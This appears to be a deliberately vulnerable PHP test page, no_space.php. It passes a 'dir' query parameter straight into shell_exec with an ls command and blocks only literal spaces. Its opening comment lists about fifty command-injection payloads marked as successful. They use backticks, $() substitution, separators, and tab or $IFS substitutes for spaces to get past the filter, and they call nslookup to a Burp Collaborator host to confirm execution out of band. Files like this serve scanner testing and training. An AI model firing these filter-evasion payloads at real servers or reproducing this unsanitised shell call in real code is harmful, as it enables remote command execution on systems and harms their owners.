<?php
# filename: no_space.php
# vulnerable (alternative argument separator needs to be applied as space is filtered)
# samle successful payloads: 
/*
The following payloads have successfully penetrated the input:
%0A%60nslookup%09458.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.
%0Anslookup%09386.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.
%3B%24%28nslookup%09449.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%3B.
`nslookup$IFS$9a28.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net`
%24%28nslookup%09146.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%0A
%60nslookup%24IFS%249a230.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A
%0A%60nslookup%09461.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.%27
%24%28nslookup%09155.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%3B
%60nslookup%09176.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%3B
%24%28nslookup%24IFS%249a218.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%3B
`nslookup$IFS$9a232.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net`&
%60nslookup%24IFS%249a221.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%F0%9F%92%A9
%60nslookup%24IFS%249a239.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%3B
$(nslookup$IFS$9a211.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net)&
%60nslookup%09158.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%F0%9F%92%A9
$(nslookup$IFS$9a217.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net);
%24%28nslookup%09137.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%F0%9F%92%A9
%60nslookup%0920.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60
%0Anslookup%09392.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.%22
%60nslookup%09161.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%00
%26nslookup%09395.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%26.
%24%28nslookup%24IFS%249a203.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%00
%7C%60nslookup%09476.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%7C.
%26%24%28nslookup%09431.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%26.
%26%60nslookup%09467.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%26.
%60nslookup%24IFS%249a233.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%26
%24%28nslookup%24IFS%249a212.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%26
%0A%24%28nslookup%09422.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%0A.
%7C%24%28nslookup%09440.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%7C.
`nslookup$IFS$9a220.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net`=©
%24%28nslookup%0917.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29
%0A%24%28nslookup%09428.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%0A.%22
%0A%60nslookup%09464.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.%22
%24%28nslookup%09149.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%26
%60nslookup%09167.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A
%60nslookup%09170.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%26
%7Cnslookup%09404.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%7C.
%0Anslookup%09389.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.%27
%60nslookup%24IFS%249a224.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%00
$(nslookup$IFS$9a199.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net)=©
%24%28nslookup%24IFS%249a209.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%0A
%24%28nslookup%09140.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%00
%0A%24%28nslookup%09425.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%0A.%27
%3Bnslookup%09413.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%3B.
%60nslookup%24IFS%249a29.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60
%24%28nslookup%24IFS%249a200.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%F0%9F%92%A9
`nslookup$IFS$9a238.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net`;
%24%28nslookup%24IFS%249a26.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29
%3B%60nslookup%09485.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%3B.
$(nslookup$IFS$9a25.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net)
*/

if(isset($_GET['dir'])&&!preg_match('/ /',$_GET['dir']))
{
	 echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
}
?>
<a href="?dir=.">clickme</a>
